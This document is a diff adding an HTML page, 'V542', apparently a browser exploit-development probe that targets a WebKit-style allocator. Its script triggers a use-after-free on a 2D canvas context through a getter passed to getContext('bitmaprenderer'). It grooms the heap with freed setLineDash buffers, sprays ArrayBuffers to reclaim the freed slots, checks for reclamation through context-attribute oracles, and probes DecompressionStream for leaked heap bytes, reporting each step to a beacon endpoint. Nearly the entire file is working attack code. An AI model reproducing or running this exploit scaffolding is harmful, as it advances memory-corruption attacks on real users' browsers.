@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V542</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+const L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n';console.log(m)}
+function beacon(tag,data){
+  const t=Date.now();
+  log('[BEACON] '+tag+': '+data);
+  new Image().src='/beacon/V542-'+tag+'?d='+encodeURIComponent(data)+'&t='+t;
+}
+
+function b64decode(b64){
+  const bin=atob(b64);
+  const u8=new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++)u8[i]=bin.charCodeAt(i);
+  return u8;
+}
+
+// Pre-computed zlib-compressed test vectors
+const COMP_5000A = b64decode('eNrtwTEBAAAAwqBs61/KFH5AAQAAAABvAykp9cU=');  // 5000 x 'A'
+const COMP_1X   = b64decode('eNqLAAAAWQBZ');  // 1 byte 'X'
+const COMP_15K  = b64decode('eNrtwYEAAAAAwyC3+UMd4QJVAQAAAAAAAAAAAAAAAADANzreHBI=');  // 15000 x 'B'
+const COMP_20K  = b64decode('eNrtwTEBAAAAwqBw69/JGh5AAQAAAAAAAAAAAAAAAAAAAAAAAPBgHTNzjQ==');  // 20000 x 'C'
+
+async function decompress(compressed, format){
+  const ds=new DecompressionStream(format||'deflate');
+  const w=ds.writable.getWriter();
+  const r=ds.readable.getReader();
+  w.write(compressed);
+  w.close();
+  const chunks=[];
+  while(true){
+    const{done,value}=await r.read();
+    if(done)break;
+    chunks.push(value);
+  }
+  const total=new Uint8Array(chunks.reduce((a,c)=>a+c.byteLength,0));
+  let off=0;
+  for(const c of chunks){total.set(c,off);off+=c.byteLength}
+  return total;
+}
+
+function scanNonZero(u8, startOff){
+  let count=0, first=-1, sample=[];
+  for(let i=startOff;i<u8.length;i++){
+    if(u8[i]!==0){
+      count++;
+      if(first<0)first=i;
+      if(sample.length<20)sample.push(i+':0x'+u8[i].toString(16));
+    }
+  }
+  return{count,first,sample};
+}
+
+function scanForPattern(u8, pattern){
+  let hits=0;
+  for(let i=0;i<=u8.length-pattern.length;i++){
+    let match=true;
+    for(let j=0;j<pattern.length;j++){
+      if(u8[i+j]!==pattern[j]){match=false;break}
+    }
+    if(match)hits++;
+  }
+  return hits;
+}
+
+async function P1_featureCheck(){
+  log('=== P1: Feature Check ===');
+  const has_ds=typeof DecompressionStream!=='undefined';
+  const has_cs=typeof CompressionStream!=='undefined';
+  beacon('P1',`DS=${has_ds},CS=${has_cs}`);
+  return has_ds;
+}
+
+async function P2_basicDecomp(){
+  log('=== P2: Basic Decompress ===');
+  try{
+    // Test 1: 5000 'A' bytes
+    const out1=await decompress(COMP_5000A);
+    const ok1=out1.length===5000 && out1.every(b=>b===0x41);
+    beacon('P2a',`len=${out1.length},allA=${ok1}`);
+
+    // Test 2: 1 byte 'X'
+    const out2=await decompress(COMP_1X);
+    const ok2=out2.length===1 && out2[0]===0x58;
+    beacon('P2b',`len=${out2.length},isX=${ok2}`);
+
+    // Test 3: 15000 'B' (just under 16KB alloc)
+    const out3=await decompress(COMP_15K);
+    const ok3=out3.length===15000 && out3.every(b=>b===0x42);
+    beacon('P2c',`len=${out3.length},allB=${ok3}`);
+
+    // Test 4: 20000 'C' (forces multi-iteration >16KB)
+    const out4=await decompress(COMP_20K);
+    const ok4=out4.length===20000 && out4.every(b=>b===0x43);
+    beacon('P2d',`len=${out4.length},allC=${ok4}`);
+
+    // Check for EXTRA bytes in any output
+    beacon('P2-extra',`5kA=${out1.length-5000},1X=${out2.length-1},15kB=${out3.length-15000},20kC=${out4.length-20000}`);
+  }catch(e){
+    beacon('P2-ERR',e.message);
+  }
+}
+
+async function P3_heapResidue(){
+  log('=== P3: Heap Residue via setLineDash ===');
+  try{
+    // Phase A: Pollute fastMalloc with recognizable doubles via setLineDash
+    // 2048 doubles * 8 bytes = 16384 bytes = matches Vector<uint8_t> alloc size
+    const DASH_COUNT=2048;
+    const MARKER_VAL=3735928559.0;  // 0xDEADBEEF as double
+    // IEEE 754 LE bytes: [00,00,e0,dd,b7,d5,eb,41]
+    const markerBytes=new Uint8Array(new Float64Array([MARKER_VAL]).buffer);
+    beacon('P3-marker','val='+MARKER_VAL+',bytes='+Array.from(markerBytes).map(b=>b.toString(16).padStart(2,'0')).join(''));
+
+    const dashArr=new Array(DASH_COUNT).fill(MARKER_VAL);
+    const canvases=[];
+    const ctxs=[];
+
+    // Create 30 contexts with the marker dash pattern
+    for(let i=0;i<30;i++){
+      const c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      const ctx=c.getContext('2d');
+      ctx.setLineDash(dashArr);
+      canvases.push(c);
+      ctxs.push(ctx);
+    }
+    beacon('P3a','created=30,dash='+DASH_COUNT);
+
+    // Free the dash buffers by setting empty dash
+    for(let i=0;i<30;i++){
+      ctxs[i].setLineDash([]);
+    }
+    beacon('P3b','freed=30');
+
+    // Now decompress — the 16KB Vector alloc might land on freed dash buffer
+    const out=await decompress(COMP_1X);  // 1 byte output, 16KB alloc internally
+    beacon('P3c-len',out.length.toString());
+
+    // If output is exactly 1 byte, the trim worked (expected case)
+    // But even if trimmed, let's try a larger decompression
+    const out2=await decompress(COMP_15K);  // 15000 bytes
+    // Check if any bytes are wrong (should all be 0x42='B')
+    let badCount=0,badSamples=[];
+    for(let i=0;i<out2.length;i++){
+      if(out2[i]!==0x42){
+        badCount++;
+        if(badSamples.length<10)badSamples.push(i+':0x'+out2[i].toString(16));
+      }
+    }
+    beacon('P3d',`bad=${badCount},samples=${badSamples.join(',')}`);
+
+    // Also try: decompress multiple times to hit different freed blocks
+    for(let round=0;round<5;round++){
+      const outR=await decompress(COMP_5000A);
+      let rBad=0;
+      for(let i=0;i<outR.length;i++){
+        if(outR[i]!==0x41)rBad++;
+      }
+      if(rBad>0)beacon('P3e-r'+round,`bad=${rBad}/${outR.length}`);
+    }
+    beacon('P3e','rounds=5,done');
+
+  }catch(e){
+    beacon('P3-ERR',e.message);
+  }
+}
+
+async function P4_nakedABSpray(){
+  log('=== P4: AB(768) Naked Freed Slot ===');
+  try{
+    // Create the UAF setup — CONFIRMED pattern: outer=bitmaprenderer, inner getter creates 2d
+    const outer=document.createElement('canvas');
+    outer.width=1;outer.height=1;
+    let innerCtx=null;
+
+    const dict={};
+    Object.defineProperty(dict,'alpha',{
+      get:function(){
+        innerCtx=outer.getContext('2d');
+        innerCtx.lineWidth=11111.11111;
+        innerCtx.globalAlpha=0.777;
+        return true;
+      }
+    });
+
+    // Outer call = bitmaprenderer, which frees the 2d context created in getter
+    outer.getContext('bitmaprenderer',dict);
+    if(!innerCtx){beacon('P4-FAIL','no innerCtx');return}
+    beacon('P4a','uaf_triggered,lw_set=11111.11111');
+
+    // Force bmalloc deallocation log flush: create+free 600 contexts (768B each)
+    // This pushes pending frees into size-class free lists
+    beacon('P4-flush','flushing bmalloc dealloc log with 600 context churn');
+    for(let i=0;i<600;i++){
+      var fc=document.createElement('canvas');fc.width=1;fc.height=1;
+      var fctx=fc.getContext('2d');
+      try{fc.getContext('bitmaprenderer')}catch(e){}
+    }
+    beacon('P4-flushed','done');
+
+    // NOW spray AB(768) — freed context should be in free list
+    const abs=[];
+    for(let i=0;i<300;i++){
+      const ab=new ArrayBuffer(768);
+      const u8=new Uint8Array(ab);
+      for(let k=0;k<768;k++)u8[k]=0x42;
+      const dv=new DataView(ab);
+      dv.setUint32(0,0xAB000000|i,true);
+      abs.push({ab:ab,u8:u8,dv:dv});
+    }
+    beacon('P4b','sprayed=300');
+
+    // Oracle: getContextAttributes reads inline m_settings — NO pointer deref
+    // (lineWidth dereferences m_stateStack.m_buffer → always crashes on freed memory)
+    beacon('P4c-pre','testing getContextAttributes (safe inline read)');
+    try{
+      var attrs=innerCtx.getContextAttributes();
+      beacon('P4c','desync='+attrs.desynchronized+',alpha='+attrs.alpha+',cs='+attrs.colorSpace);
+      if(attrs.desynchronized!==false){
+        beacon('P4c-RECLAIMED','*** desynchronized changed! AB reclaimed slot! ***');
+      }
+    }catch(e){beacon('P4c-ERR','getContextAttributes: '+e)}
+
+    // Oracle 2: save() increments m_unrealizedSaveCount — no pointer deref
+    beacon('P4d-pre','save increment test');
+    try{
+      var snaps=[];
+      for(let i=0;i<abs.length;i++)snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+      for(let s=0;s<5;s++)innerCtx.save();
+      for(let i=0;i<abs.length;i++){
+        for(let j=0;j<768;j++){
+          if(abs[i].u8[j]!==snaps[i][j]){
+            var diffs=[];
+            for(let jj=j;jj<768;jj++){
+              if(abs[i].u8[jj]!==snaps[i][jj])diffs.push(jj+':'+snaps[i][jj]+'->'+abs[i].u8[jj]);
+              if(diffs.length>=10)break;
+            }
+            beacon('P4d-HIT','AB['+i+'] changed! '+diffs.join(','));
+            break;
+          }
+        }
+      }
+      beacon('P4d','save test done');
+    }catch(e){beacon('P4d-ERR','save: '+e)}
+
+  }catch(e){
+    beacon('P4-ERR',e.message);
+  }
+}
+
+async function P5_nakedAB16K(){
+  log('=== P5: AB(16384) Naked Dash Reclaim ===');
+  try{
+    // Allocate dash buffers via setLineDash, then free, then AB(16384) spray
+    const DASH=2048;  // 2048 * 8 = 16384
+    const MARKER=12345.6789;
+    const dashArr=new Array(DASH).fill(MARKER);
+
+    const ctxs2=[];
+    for(let i=0;i<20;i++){
+      const c=document.createElement('canvas');c.width=1;c.height=1;
+      const ctx=c.getContext('2d');
+      ctx.setLineDash(dashArr);
+      ctxs2.push(ctx);
+    }
+
+    // Free dash buffers
+    for(const ctx of ctxs2)ctx.setLineDash([]);
+    beacon('P5a','freed=20,size=16384');
+
+    // Spray AB(16384)
+    const abs16=[];
+    for(let i=0;i<50;i++){
+      const ab=new ArrayBuffer(16384);
+      const dv=new DataView(ab);
+      // Check if any bytes are non-zero (would mean we got a freed dash buffer!)
+      let nonzero=0;
+      for(let j=0;j<16384;j+=8){
+        if(dv.getFloat64(j,true)!==0)nonzero++;
+      }
+      if(nonzero>0){
+        beacon('P5-HIT','ab='+i+',nonzero_doubles='+nonzero);
+        // Sample first few values
+        const samples=[];
+        for(let j=0;j<Math.min(16384,80);j+=8){
+          const v=dv.getFloat64(j,true);
+          if(v!==0)samples.push(j+':'+v);
+        }
+        beacon('P5-SAMPLE',samples.join(','));
+      }
+      abs16.push(ab);
+    }
+    beacon('P5b','sprayed=50,checked');
+
+  }catch(e){
+    beacon('P5-ERR',e.message);
+  }
+}
+
+async function P6_decompressionEdgeCases(){
+  log('=== P6: DecompressionStream Edge Cases ===');
+  try{
+    // Test: Write compressed data in small chunks to see if partial inflate leaks
+    const ds=new DecompressionStream('deflate');
+    const w=ds.writable.getWriter();
+    const r=ds.readable.getReader();
+
+    // Split COMP_20K into tiny chunks (3 bytes each)
+    const src=COMP_20K;
+    const chunkSize=3;
+    for(let i=0;i<src.length;i+=chunkSize){
+      const end=Math.min(i+chunkSize,src.length);
+      await w.write(src.slice(i,end));
+    }
+    await w.close();
+
+    const chunks=[];
+    let totalLen=0;
+    while(true){
+      const{done,value}=await r.read();
+      if(done)break;
+      chunks.push(value);
+      totalLen+=value.byteLength;
+    }
+    beacon('P6a',`chunks=${chunks.length},total=${totalLen},expected=20000`);
+
+    // Check each chunk for unexpected bytes
+    let allC=true;
+    for(const ch of chunks){
+      for(let i=0;i<ch.length;i++){
+        if(ch[i]!==0x43){allC=false;break}
+      }
+      if(!allC)break;
+    }
+    beacon('P6b',`allC=${allC}`);
+
+    // Individual chunk lengths (might reveal 16KB alignment artifacts)
+    const lens=chunks.map(c=>c.byteLength);
+    beacon('P6c','chunklens='+lens.join(','));
+
+  }catch(e){
+    beacon('P6-ERR',e.message);
+  }
+}
+
+async function P7_flushWithoutComplete(){
+  log('=== P7: Flush Without Complete Stream ===');
+  try{
+    // Send only HALF of compressed data, then close — does the output contain extra bytes?
+    const halfComp=COMP_20K.slice(0,Math.floor(COMP_20K.length/2));
+    const ds=new DecompressionStream('deflate');
+    const w=ds.writable.getWriter();
+    const r=ds.readable.getReader();
+
+    await w.write(halfComp);
+    // Close the writable side (triggers flush with incomplete stream)
+    try{await w.close()}catch(e){beacon('P7-close-err',e.message)}
+
+    const chunks=[];
+    try{
+      const readPromise=new Promise(async(resolve)=>{
+        const timeout=setTimeout(()=>resolve('timeout'),3000);
+        try{
+          while(true){
+            const{done,value}=await r.read();
+            if(done)break;
+            chunks.push(value);
+          }
+          clearTimeout(timeout);
+          resolve('done');
+        }catch(e){
+          clearTimeout(timeout);
+          resolve('read-err:'+e.message);
+        }
+      });
+      const result=await readPromise;
+      const totalLen=chunks.reduce((a,c)=>a+c.byteLength,0);
+      beacon('P7',`result=${result},chunks=${chunks.length},total=${totalLen}`);
+
+      // If we got partial data, scan for non-0x43 bytes
+      if(totalLen>0){
+        let badBytes=0;
+        for(const ch of chunks){
+          for(let i=0;i<ch.length;i++){
+            if(ch[i]!==0x43)badBytes++;
+          }
+        }
+        beacon('P7-scan',`bad=${badBytes}/${totalLen}`);
+      }
+    }catch(e){
+      beacon('P7-read-err',e.message);
+    }
+  }catch(e){
+    beacon('P7-ERR',e.message);
+  }
+}
+
+(async function(){
+  beacon('BOOT','V542-start');
+  try{
+    const hasDS=await P1_featureCheck();
+    if(!hasDS){beacon('DEAD','no-DecompressionStream');return}
+    await P2_basicDecomp();
+    await P3_heapResidue();
+    await P4_nakedABSpray();
+    await P5_nakedAB16K();
+    await P6_decompressionEdgeCases();
+    await P7_flushWithoutComplete();
+    beacon('DONE','V542-complete');
+  }catch(e){
+    beacon('FATAL',e.message);
+  }
+})();
+</script>
+</body></html>
